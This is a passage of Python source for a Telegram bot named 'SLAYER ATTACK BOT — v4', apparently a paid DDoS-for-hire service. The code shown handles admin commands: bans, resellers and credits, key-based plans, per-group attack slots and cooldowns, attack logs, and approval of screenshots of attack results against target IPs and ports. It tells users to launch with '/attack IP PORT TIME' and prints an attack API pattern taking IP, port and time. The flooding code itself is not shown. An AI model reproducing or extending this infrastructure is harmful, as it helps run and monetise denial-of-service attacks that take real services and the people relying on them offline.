        if args[1] in us: us[args[1]]["banned"] = False; save(USER_FILE, us)
        bot.send_message(message.chat.id,
            f"╔══════════════════════════════════╗\n"
            f"║  {E['unlock']} USER UNBANNED                 ║\n"
            f"╚══════════════════════════════════╝\n"
            f"\n{E['id']} ID: {C(args[1])} — access restored",
            parse_mode='HTML')
        try:
            bot.send_message(int(args[1]),
                f"╔══════════════════════════════════╗\n"
                f"║  {E['unlock']} YOU HAVE BEEN UNBANNED       ║\n"
                f"╚══════════════════════════════════╝\n"
                f"\n{E['check']} Bot access restored\n"
                f"{E['key']} Use /redeem to activate a plan",
                parse_mode='HTML')
        except: pass
    else:
        bot.send_message(message.chat.id, f"{E['cross']} User not in ban list", parse_mode='HTML')

@bot.message_handler(commands=['bannedlist'])
def bannedlist_cmd(message):
    if not is_admin(message.from_user.id):
        bot.send_message(message.chat.id, f"{E['noentry']} Admin only", parse_mode='HTML'); return
    banned = load(BANNED_FILE, {})
    if not banned:
        bot.send_message(message.chat.id,
            f"╔══════════════════════════════════╗\n"
            f"║  {E['check']} NO BANNED USERS               ║\n"
            f"╚══════════════════════════════════╝",
            parse_mode='HTML'); return
    lines = [
        f"╔══════════════════════════════════╗",
        f"║  {E['lock']} BANNED USERS ({len(banned)})            ║",
        f"╚══════════════════════════════════╝",
        f"",
        f"━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━",
    ]
    for uid, info in banned.items():
        lines.append(f"   {E['red']} {C(uid)}")
        lines.append(f"         {E['clipboard']} {info.get('reason','')}")
    lines.append(f"━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━")
    bot.send_message(message.chat.id, "\n".join(lines), parse_mode='HTML')

# ══════════════════════════════════════════════
# 🤝 RESELLER MANAGEMENT
# ══════════════════════════════════════════════
@bot.message_handler(commands=['addreseller'])
def addreseller_cmd(message):
    if not is_admin(message.from_user.id):
        bot.send_message(message.chat.id, f"{E['noentry']} Admin only", parse_mode='HTML'); return
    args = message.text.split()
    if len(args) != 2:
        bot.send_message(message.chat.id, f"{E['noentry']} /addreseller USER_ID", parse_mode='HTML'); return
    res = load(RESELLER_FILE, {})
    res[args[1]] = {"added_on":datetime.datetime.now().isoformat()}
    save(RESELLER_FILE, res)
    bot.send_message(message.chat.id,
        f"╔══════════════════════════════════╗\n"
        f"║  {E['handshake']} RESELLER ADDED                ║\n"
        f"╚══════════════════════════════════╝\n"
        f"\n{E['id']} ID: {C(args[1])}",
        parse_mode='HTML')
    try:
        bot.send_message(int(args[1]),
            f"╔══════════════════════════════════╗\n"
            f"║  {E['handshake']} YOU ARE NOW A RESELLER        ║\n"
            f"╚══════════════════════════════════╝\n"
            f"\n"
            f"   {E['moneybag']}  /reseller_panel  ›  Dashboard\n"
            f"   {E['gem']}   /balance         ›  Your credits\n"
            f"   {E['key']}  /genkey           ›  Generate keys",
            parse_mode='HTML')
    except: pass

@bot.message_handler(commands=['removereseller'])
def removereseller_cmd(message):
    if not is_admin(message.from_user.id):
        bot.send_message(message.chat.id, f"{E['noentry']} Admin only", parse_mode='HTML'); return
    args = message.text.split()
    if len(args) != 2:
        bot.send_message(message.chat.id, f"{E['noentry']} /removereseller USER_ID", parse_mode='HTML'); return
    res = load(RESELLER_FILE, {})
    if args[1] in res:
        del res[args[1]]; save(RESELLER_FILE, res)
        bot.send_message(message.chat.id,
            f"╔══════════════════════════════════╗\n"
            f"║  {E['check']} RESELLER REMOVED              ║\n"
            f"╚══════════════════════════════════╝\n"
            f"\n{E['id']} ID: {C(args[1])}",
            parse_mode='HTML')
        try:
            bot.send_message(int(args[1]),
                f"╔══════════════════════════════════╗\n"
                f"║  {E['cross']} RESELLER ACCESS REVOKED       ║\n"
                f"╚══════════════════════════════════╝\n"
                f"\n{E['bell']} Contact admin for more info",
                parse_mode='HTML')
        except: pass
    else:
        bot.send_message(message.chat.id, f"{E['cross']} Not a reseller", parse_mode='HTML')

@bot.message_handler(commands=['resellers'])
def resellers_cmd(message):
    if not is_admin(message.from_user.id):
        bot.send_message(message.chat.id, f"{E['noentry']} Admin only", parse_mode='HTML'); return
    res = load(RESELLER_FILE, {})
    if not res:
        bot.send_message(message.chat.id,
            f"╔══════════════════════════════════╗\n"
            f"║  {E['people']} RESELLERS                     ║\n"
            f"╚══════════════════════════════════╝\n"
            f"\n{E['cross']} No resellers yet",
            parse_mode='HTML'); return
    lines = [
        f"╔══════════════════════════════════╗",
        f"║  {E['handshake']} RESELLERS ({len(res)})               ║",
        f"╚══════════════════════════════════╝",
        f"",
        f"━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━",
    ]
    for uid in res:
        lines.append(f"   {E['gem']} {C(uid)}")
        lines.append(f"         {E['moneybag']} {get_balance(uid)} credits")
    lines.append(f"━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━")
    bot.send_message(message.chat.id, "\n".join(lines), parse_mode='HTML')

@bot.message_handler(commands=['addbalance'])
def addbalance_cmd(message):
    if not is_admin(message.from_user.id):
        bot.send_message(message.chat.id, f"{E['noentry']} Admin only", parse_mode='HTML'); return
    args = message.text.split()
    if len(args) != 3:
        bot.send_message(message.chat.id, f"{E['noentry']} /addbalance USER_ID AMOUNT", parse_mode='HTML'); return
    try: amt = int(args[2])
    except:
        bot.send_message(message.chat.id, f"{E['noentry']} Invalid amount", parse_mode='HTML'); return
    new_bal = add_balance(args[1], amt)
    bot.send_message(message.chat.id,
        f"╔══════════════════════════════════╗\n"
        f"║  {E['money']} BALANCE ADDED                 ║\n"
        f"╚══════════════════════════════════╝\n"
        f"\n"
        f"   {E['id']}       ID      : {C(args[1])}\n"
        f"   {E['money']}    Added   : +{B(str(amt))} credits\n"
        f"   {E['moneybag']} Balance : {B(str(new_bal))} credits",
        parse_mode='HTML')
    try:
        bot.send_message(int(args[1]),
            f"╔══════════════════════════════════╗\n"
            f"║  {E['money']} CREDITS ADDED                 ║\n"
            f"╚══════════════════════════════════╝\n"
            f"\n"
            f"   {E['money']}    Added   : +{amt} credits\n"
            f"   {E['moneybag']} Balance : {new_bal} credits",
            parse_mode='HTML')
    except: pass

# ══════════════════════════════════════════════
# 🌐 GROUP SYSTEM
# ══════════════════════════════════════════════
@bot.message_handler(commands=['addgroup'])
def addgroup_cmd(message):
    if not is_admin(message.from_user.id):
        bot.send_message(message.chat.id, f"{E['noentry']} Admin only", parse_mode='HTML'); return
    args = message.text.split()
    if len(args) != 5:
        bot.send_message(message.chat.id,
            f"╔══════════════════════════════════╗\n"
            f"║  {E['globe']} ADD GROUP                     ║\n"
            f"╚══════════════════════════════════╝\n"
            f"\n"
            f"   {E['arrow']} Usage  : /addgroup CHAT_ID SLOTS TIME COOLDOWN\n"
            f"   {E['lightbulb']} TIME and COOLDOWN in seconds\n"
            f"   {E['arrow']} Example: {C('/addgroup -1001234567890 2 60 120')}",
            parse_mode='HTML'); return
    try:
        chat_id   = int(args[1])
        max_slots = int(args[2])
        max_time  = int(args[3])
        cooldown  = int(args[4])
    except:
        bot.send_message(message.chat.id, f"{E['noentry']} All values must be numbers", parse_mode='HTML'); return
    add_group(chat_id, max_slots, max_time, cooldown)
    bot.send_message(message.chat.id,
        f"╔══════════════════════════════════╗\n"
        f"║  {E['check']} GROUP REGISTERED              ║\n"
        f"╚══════════════════════════════════╝\n"
        f"\n"
        f"━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
        f"   {E['globe']}     Chat ID  : {C(str(chat_id))}\n"
        f"   {E['fire']}      Slots    : {B(str(max_slots))}\n"
        f"   {E['clock']}     Max Time : {B(fmt_time(max_time))}\n"
        f"   {E['hourglass']} Cooldown : {B(fmt_time(cooldown))}\n"
        f"━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━",
        parse_mode='HTML')
    try:
        bot.send_message(chat_id,
            f"╔══════════════════════════════════╗\n"
            f"║  {E['check']} {E['party']} ATTACK SYSTEM ENABLED    ║\n"
            f"╚══════════════════════════════════╝\n"
            f"\n"
            f"━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
            f"   {E['fire']}      Slots    : {max_slots} concurrent\n"
            f"   {E['clock']}     Max Time : {fmt_time(max_time)}\n"
            f"   {E['hourglass']} Cooldown : {fmt_time(cooldown)}\n"
            f"━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
            f"\n{E['rocket']} Use /attack IP PORT TIME to launch",
            parse_mode='HTML')
    except: pass

@bot.message_handler(commands=['removegroup'])
def removegroup_cmd(message):
    if not is_admin(message.from_user.id):
        bot.send_message(message.chat.id, f"{E['noentry']} Admin only", parse_mode='HTML'); return
    args = message.text.split()
    if len(args) != 2:
        bot.send_message(message.chat.id, f"{E['noentry']} /removegroup CHAT_ID", parse_mode='HTML'); return
    try: chat_id = int(args[1])
    except:
        bot.send_message(message.chat.id, f"{E['noentry']} Invalid chat ID", parse_mode='HTML'); return
    if remove_group(chat_id):
        bot.send_message(message.chat.id,
            f"╔══════════════════════════════════╗\n"
            f"║  {E['check']} GROUP REMOVED                 ║\n"
            f"╚══════════════════════════════════╝\n"
            f"\n{E['globe']} ID: {C(str(chat_id))}",
            parse_mode='HTML')
    else:
        bot.send_message(message.chat.id, f"{E['cross']} Group not found in registry", parse_mode='HTML')

@bot.message_handler(commands=['grouplist'])
def grouplist_cmd(message):
    if not is_admin(message.from_user.id):
        bot.send_message(message.chat.id, f"{E['noentry']} Admin only", parse_mode='HTML'); return
    groups = get_groups()
    if not groups:
        bot.send_message(message.chat.id,
            f"╔══════════════════════════════════╗\n"
            f"║  {E['globe']} REGISTERED GROUPS             ║\n"
            f"╚══════════════════════════════════╝\n"
            f"\n{E['cross']} No groups registered",
            parse_mode='HTML'); return
    lines = [
        f"╔══════════════════════════════════╗",
        f"║  {E['globe']} GROUPS ({len(groups)})                  ║",
        f"╚══════════════════════════════════╝",
        f"",
        f"━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━",
    ]
    for cid, cfg in groups.items():
        active_cnt = group_active_count(int(cid))
        lines.append(f"   {E['globe']} {C(cid)}")
        lines.append(f"         {E['fire']}      Slots    : {active_cnt}/{cfg['max_slots']}")
        lines.append(f"         {E['clock']}     Max Time : {fmt_time(cfg['max_time'])}")
        lines.append(f"         {E['hourglass']} Cooldown : {fmt_time(cfg['cooldown'])}")
        lines.append(f"")
    lines.append(f"━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━")
    bot.send_message(message.chat.id, "\n".join(lines), parse_mode='HTML')

# ══════════════════════════════════════════════
# ⚙️ SYSTEM COMMANDS
# ══════════════════════════════════════════════
@bot.message_handler(commands=['setlimit'])
def setlimit_cmd(message):
    if not is_admin(message.from_user.id):
        bot.send_message(message.chat.id, f"{E['noentry']} Admin only", parse_mode='HTML'); return
    global MAX_CONCURRENT_ATTACKS, MAX_ATTACK_DURATION, COOLDOWN_SECONDS
    args = message.text.split()
    if len(args) != 4:
        bot.send_message(message.chat.id,
            f"╔══════════════════════════════════╗\n"
            f"║  {E['gear']} CURRENT LIMITS               ║\n"
            f"╚══════════════════════════════════╝\n"
            f"\n"
            f"   {E['fire']}      Slots    : {B(str(MAX_CONCURRENT_ATTACKS))}\n"
            f"   {E['clock']}     Max Time : {B(fmt_time(MAX_ATTACK_DURATION))}\n"
            f"   {E['hourglass']} Cooldown : {B(fmt_time(COOLDOWN_SECONDS))}\n"
            f"\n"
            f"   {E['arrow']} Usage: /setlimit SLOTS DUR_SEC COOLDOWN_SEC",
            parse_mode='HTML'); return
    try:
        MAX_CONCURRENT_ATTACKS = int(args[1])
        MAX_ATTACK_DURATION    = int(args[2])
        COOLDOWN_SECONDS       = int(args[3])
        bot.send_message(message.chat.id,
            f"╔══════════════════════════════════╗\n"
            f"║  {E['check']} LIMITS UPDATED               ║\n"
            f"╚══════════════════════════════════╝\n"
            f"\n"
            f"   {E['fire']}      Slots    : {B(str(MAX_CONCURRENT_ATTACKS))}\n"
            f"   {E['clock']}     Max Time : {B(fmt_time(MAX_ATTACK_DURATION))}\n"
            f"   {E['hourglass']} Cooldown : {B(fmt_time(COOLDOWN_SECONDS))}",
            parse_mode='HTML')
    except:
        bot.send_message(message.chat.id, f"{E['noentry']} Invalid values", parse_mode='HTML')

@bot.message_handler(commands=['broadcast'])
def broadcast_cmd(message):
    if not is_admin(message.from_user.id):
        bot.send_message(message.chat.id, f"{E['noentry']} Admin only", parse_mode='HTML'); return
    text = message.text.replace('/broadcast','',1).strip()
    if not text:
        bot.send_message(message.chat.id, f"{E['noentry']} /broadcast MESSAGE", parse_mode='HTML'); return
    su = load(STARTED_USERS_FILE, [])
    ok, fail = 0, 0
    for uid in su:
        try:
            bot.send_message(uid,
                f"╔══════════════════════════════════╗\n"
                f"║  {E['bell']} ANNOUNCEMENT                  ║\n"
                f"╚══════════════════════════════════╝\n"
                f"\n{text}",
                parse_mode='HTML')
            ok += 1; time.sleep(0.05)
        except: fail += 1
    bot.send_message(message.chat.id,
        f"╔══════════════════════════════════╗\n"
        f"║  {E['check']} BROADCAST DONE                ║\n"
        f"╚══════════════════════════════════╝\n"
        f"\n"
        f"   {E['green']} Sent   : {B(str(ok))}\n"
        f"   {E['red']}   Failed : {B(str(fail))}",
        parse_mode='HTML')

@bot.message_handler(commands=['stats'])
def stats_cmd(message):
    if not is_admin(message.from_user.id):
        bot.send_message(message.chat.id, f"{E['noentry']} Admin only", parse_mode='HTML'); return
    users  = load(USER_FILE, {})
    res    = load(RESELLER_FILE, {})
    banned = load(BANNED_FILE, {})
    kd     = load(KEYS_FILE, {"used":{},"unused":{}})
    su     = load(STARTED_USERS_FILE, [])
    groups = get_groups()
    active_users = 0
    for info in users.values():
        if info.get("banned"): continue
        try:
            if datetime.datetime.now() <= datetime.datetime.fromisoformat(info.get("expiry","1970-01-01")):
                active_users += 1
        except: pass
    up = time.time() - bot_start_time
    h  = int(up//3600); m = int((up%3600)//60)
    bot.send_message(message.chat.id,
        f"╔══════════════════════════════════╗\n"
        f"║  {E['chart']} BOT STATISTICS               ║\n"
        f"╚══════════════════════════════════╝\n"
        f"\n"
        f"━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
        f"   {E['green']}      Active Users   : {B(str(active_users))}\n"
        f"   {E['people']}     Total Started  : {B(str(len(su)))}\n"
        f"   {E['handshake']}  Resellers      : {B(str(len(res)))}\n"
        f"   {E['lock']}       Banned         : {B(str(len(banned)))}\n"
        f"   {E['globe']}      Groups         : {B(str(len(groups)))}\n"
        f"   {E['key']}        Unused Keys    : {B(str(len(kd['unused'])))}\n"
        f"   {E['key2']}       Used Keys      : {B(str(len(kd['used'])))}\n"
        f"━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
        f"   {E['fire']}      Active Attacks : {B(str(len(active_attacks)))}/{B(str(MAX_CONCURRENT_ATTACKS))}\n"
        f"   {E['clock']}     Max Duration   : {B(fmt_time(MAX_ATTACK_DURATION))}\n"
        f"   {E['hourglass']} Cooldown       : {B(fmt_time(COOLDOWN_SECONDS))}\n"
        f"   {E['camera']}    Feedback       : {B('ON' if feedback_required else 'OFF')}\n"
        f"   {E['globe']}     Force Join     : {B('ON' if force_join else 'OFF')}\n"
        f"   {E['gear']}      Maintenance    : {B('ON' if maintenance_mode else 'OFF')}\n"
        f"   {E['stopwatch']} Uptime         : {B(f'{h}h {m}m')}\n"
        f"━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━",
        parse_mode='HTML')

@bot.message_handler(commands=['systeminfo'])
def systeminfo_cmd(message):
    if not is_admin(message.from_user.id):
        bot.send_message(message.chat.id, f"{E['noentry']} Admin only", parse_mode='HTML'); return
    cpu  = psutil.cpu_percent(interval=0.5)
    mem  = psutil.virtual_memory()
    disk = psutil.disk_usage('/')
    up   = time.time() - bot_start_time
    h    = int(up//3600); m = int((up%3600)//60)
    bot.send_message(message.chat.id,
        f"╔══════════════════════════════════╗\n"
        f"║  {E['gear']} SYSTEM INFO                   ║\n"
        f"╚══════════════════════════════════╝\n"
        f"\n"
        f"━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
        f"   {E['globe']}     OS     : {B(platform.system() + ' ' + platform.release())}\n"
        f"   {E['chart']}     CPU    : {B(str(cpu) + '%')}\n"
        f"   {E['chart2']}    RAM    : {B(str(mem.percent) + '%')} ({mem.used//1024//1024}MB / {mem.total//1024//1024}MB)\n"
        f"   {E['clipboard']} Disk   : {B(str(disk.percent) + '%')}\n"
        f"   {E['stopwatch']} Uptime : {B(f'{h}h {m}m')}\n"
        f"━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━",
        parse_mode='HTML')

@bot.message_handler(commands=['logs'])
def logs_cmd(message):
    if not is_admin(message.from_user.id):
        bot.send_message(message.chat.id, f"{E['noentry']} Admin only", parse_mode='HTML'); return
    if os.path.exists(LOG_FILE) and os.path.getsize(LOG_FILE) > 0:
        with open(LOG_FILE,"rb") as f:
            bot.send_document(message.chat.id, f,
                caption=f"╔══════════════════════════════════╗\n║  {E['clipboard']} ATTACK LOGS                  ║\n╚══════════════════════════════════╝")
    else:
        bot.send_message(message.chat.id, f"{E['cross']} No logs yet", parse_mode='HTML')

@bot.message_handler(commands=['faillogs'])
def faillogs_cmd(message):
    if not is_admin(message.from_user.id):
        bot.send_message(message.chat.id, f"{E['noentry']} Admin only", parse_mode='HTML'); return
    if os.path.exists(FAIL_LOG_FILE) and os.path.getsize(FAIL_LOG_FILE) > 0:
        with open(FAIL_LOG_FILE,"rb") as f:
            bot.send_document(message.chat.id, f,
                caption=f"╔══════════════════════════════════╗\n║  {E['warning']} FAILURE LOGS                 ║\n╚══════════════════════════════════╝")
    else:
        bot.send_message(message.chat.id,
            f"╔══════════════════════════════════╗\n"
            f"║  {E['check']} NO FAILURES                   ║\n"
            f"╚══════════════════════════════════╝\n"
            f"\n{E['hundred']} All attacks succeeded",
            parse_mode='HTML')

@bot.message_handler(commands=['clearlogs'])
def clearlogs_cmd(message):
    if not is_admin(message.from_user.id):
        bot.send_message(message.chat.id, f"{E['noentry']} Admin only", parse_mode='HTML'); return
    for f in [LOG_FILE, FAIL_LOG_FILE]: open(f,'w').close()
    bot.send_message(message.chat.id,
        f"╔══════════════════════════════════╗\n"
        f"║  {E['check']} LOGS CLEARED                  ║\n"
        f"╚══════════════════════════════════╝",
        parse_mode='HTML')

@bot.message_handler(commands=['maintanence'])
def maintenance_cmd(message):
    global maintenance_mode
    if str(message.from_user.id) != OWNER_ID:
        bot.send_message(message.chat.id, f"{E['noentry']} Owner only", parse_mode='HTML'); return
    args = message.text.split()
    if len(args) != 2 or args[1].lower() not in ["on","off"]:
        bot.send_message(message.chat.id, f"{E['noentry']} /maintanence on|off", parse_mode='HTML'); return
    maintenance_mode = args[1].lower() == "on"
    bot.send_message(message.chat.id,
        f"╔══════════════════════════════════╗\n"
        f"║  {E['gear']} MAINTENANCE MODE              ║\n"
        f"╚══════════════════════════════════╝\n"
        f"\n{E['gear']} Status : {B('ON' if maintenance_mode else 'OFF')}",
        parse_mode='HTML')

@bot.message_handler(commands=['feedback'])
def feedback_toggle_cmd(message):
    global feedback_required
    if str(message.from_user.id) != OWNER_ID:
        bot.send_message(message.chat.id, f"{E['noentry']} Owner only", parse_mode='HTML'); return
    args = message.text.split()
    if len(args) != 2 or args[1].lower() not in ["on","off"]:
        bot.send_message(message.chat.id, f"{E['noentry']} /feedback on|off", parse_mode='HTML'); return
    feedback_required = args[1].lower() == "on"
    bot.send_message(message.chat.id,
        f"╔══════════════════════════════════╗\n"
        f"║  {E['camera']} FEEDBACK SETTING             ║\n"
        f"╚══════════════════════════════════╝\n"
        f"\n{E['camera']} Required : {B('ON' if feedback_required else 'OFF')}",
        parse_mode='HTML')

@bot.message_handler(commands=['forcejoin'])
def forcejoin_cmd(message):
    global force_join
    if str(message.from_user.id) != OWNER_ID:
        bot.send_message(message.chat.id, f"{E['noentry']} Owner only", parse_mode='HTML'); return
    args = message.text.split()
    if len(args) != 2 or args[1].lower() not in ["on","off"]:
        bot.send_message(message.chat.id, f"{E['noentry']} /forcejoin on|off", parse_mode='HTML'); return
    force_join = args[1].lower() == "on"
    bot.send_message(message.chat.id,
        f"╔══════════════════════════════════╗\n"
        f"║  {E['globe']} FORCE JOIN SETTING           ║\n"
        f"╚══════════════════════════════════╝\n"
        f"\n{E['globe']} Force Join : {B('ON' if force_join else 'OFF')}",
        parse_mode='HTML')

@bot.message_handler(commands=['clearpending'])
def clearpending_cmd(message):
    if not is_admin(message.from_user.id):
        bot.send_message(message.chat.id, f"{E['noentry']} Admin only", parse_mode='HTML'); return
    args = message.text.split()
    if len(args) != 2:
        bot.send_message(message.chat.id, f"{E['noentry']} /clearpending USER_ID", parse_mode='HTML'); return
    try: uid = int(args[1])
    except:
        bot.send_message(message.chat.id, f"{E['noentry']} Invalid user ID", parse_mode='HTML'); return
    if uid in pending_feedback:
        pending_feedback.pop(uid)
        bot.send_message(message.chat.id,
            f"╔══════════════════════════════════╗\n"
            f"║  {E['check']} FEEDBACK BLOCK CLEARED       ║\n"
            f"╚══════════════════════════════════╝\n"
            f"\n{E['id']} ID: {C(str(uid))}",
            parse_mode='HTML')
    else:
        bot.send_message(message.chat.id, f"{E['cross']} No pending feedback for {C(str(uid))}", parse_mode='HTML')

@bot.message_handler(commands=['approvefb'])
def approvefb_cmd(message):
    if str(message.from_user.id) != OWNER_ID:
        bot.send_message(message.chat.id, f"{E['noentry']} Owner only", parse_mode='HTML'); return
    args = message.text.split()
    if len(args) != 2:
        bot.send_message(message.chat.id, f"{E['noentry']} /approvefb USER_ID", parse_mode='HTML'); return
    try: uid = int(args[1])
    except:
        bot.send_message(message.chat.id, f"{E['noentry']} Invalid user ID", parse_mode='HTML'); return
    if uid in pending_approval:
        data = pending_approval.pop(uid)
        cap  = (
            f"╔══════════════════════════════════╗\n"
            f"║  {E['check']} APPROVED FEEDBACK             ║\n"
            f"╚══════════════════════════════════╝\n"
            f"\n"
            f"   {E['user']}  UID  : {C(str(uid))}\n"
            f"   {E['target']} IP   : {C(data['target'])}\n"
            f"   {E['gear']}  Port : {C(str(data['port']))}"
        )
        try: bot.send_photo(CHANNEL_ID, data['file_id'], caption=cap, parse_mode='HTML')
        except: pass
        pending_feedback.pop(uid, None)
        bot.send_message(message.chat.id,
            f"╔══════════════════════════════════╗\n"
            f"║  {E['check']} APPROVED                      ║\n"
            f"╚══════════════════════════════════╝",
            parse_mode='HTML')
        try:
            bot.send_message(uid,
                f"╔══════════════════════════════════╗\n"
                f"║  {E['check']} FEEDBACK APPROVED             ║\n"
                f"╚══════════════════════════════════╝\n"
                f"\n{E['rocket']} You can now launch your next attack",
                parse_mode='HTML')
        except: pass
    else:
        bot.send_message(message.chat.id, f"{E['cross']} No pending approval for {C(str(uid))}", parse_mode='HTML')

@bot.message_handler(commands=['rejectfb'])
def rejectfb_cmd(message):
    if str(message.from_user.id) != OWNER_ID:
        bot.send_message(message.chat.id, f"{E['noentry']} Owner only", parse_mode='HTML'); return
    args = message.text.split()
    if len(args) != 2:
        bot.send_message(message.chat.id, f"{E['noentry']} /rejectfb USER_ID", parse_mode='HTML'); return
    try: uid = int(args[1])
    except:
        bot.send_message(message.chat.id, f"{E['noentry']} Invalid user ID", parse_mode='HTML'); return
    if uid in pending_approval:
        pending_approval.pop(uid)
        bot.send_message(message.chat.id,
            f"╔══════════════════════════════════╗\n"
            f"║  {E['cross']} FEEDBACK REJECTED             ║\n"
            f"╚══════════════════════════════════╝",
            parse_mode='HTML')
        try:
            bot.send_message(uid,
                f"╔══════════════════════════════════╗\n"
                f"║  {E['cross']} FEEDBACK REJECTED             ║\n"
                f"╚══════════════════════════════════╝\n"
                f"\n{E['camera']} Send a valid screenshot of your attack results",
                parse_mode='HTML')
        except: pass
    else:
        bot.send_message(message.chat.id, f"{E['cross']} No pending approval for {C(str(uid))}", parse_mode='HTML')

# ══════════════════════════════════════════════
# 🔔 EXPIRY NOTIFIER (BACKGROUND)
# ══════════════════════════════════════════════
def expiry_notifier():
    while True:
        time.sleep(60)
        try:
            users   = load(USER_FILE, {})
            now     = datetime.datetime.now()
            changed = False
            for uid, info in list(users.items()):
                if info.get("banned") or info.get("notified"): continue
                try:
                    expiry = datetime.datetime.fromisoformat(info["expiry"])
                    if now >= expiry:
                        try:
                            bot.send_message(int(uid),
                                f"╔══════════════════════════════════╗\n"
                                f"║  {E['hourglass']} PLAN EXPIRED                  ║\n"
                                f"╚══════════════════════════════════╝\n"
                                f"\n"
                                f"   {E['key']}      Key     : {C(info.get('key','N/A'))}\n"
                                f"   {E['calendar']} Expired : {C(expiry.strftime('%Y-%m-%d %H:%M:%S'))}\n"
                                f"\n"
                                f"━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
                                f"   {E['arrow']}  /redeem KEY  ›  Renew plan\n"
                                f"   {E['plane']} Contact admin to purchase\n"
                                f"━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━",
                                parse_mode='HTML')
                        except: pass
                        info["notified"] = True; users[uid] = info; changed = True
                except: pass
            if changed: save(USER_FILE, users)
        except: pass

threading.Thread(target=expiry_notifier, daemon=True).start()

# ══════════════════════════════════════════════
# 🚀 MAIN
# ══════════════════════════════════════════════
if __name__ == "__main__":
    print("=" * 55)
    print("  SLAYER ATTACK BOT — v4")
    print(f"  API: {_API_BASE}/IP/PORT/TIME?key=KEY")
    print("  Owner gets full API response per attack")
    print("  Zero API info leaks to users")
    print("=" * 55)
    while True:
        try:
            bot.infinity_polling(timeout=30, long_polling_timeout=30)
        except Exception as e:
            print(f"[{datetime.datetime.now()}] Polling error: {e}")
            time.sleep(3)
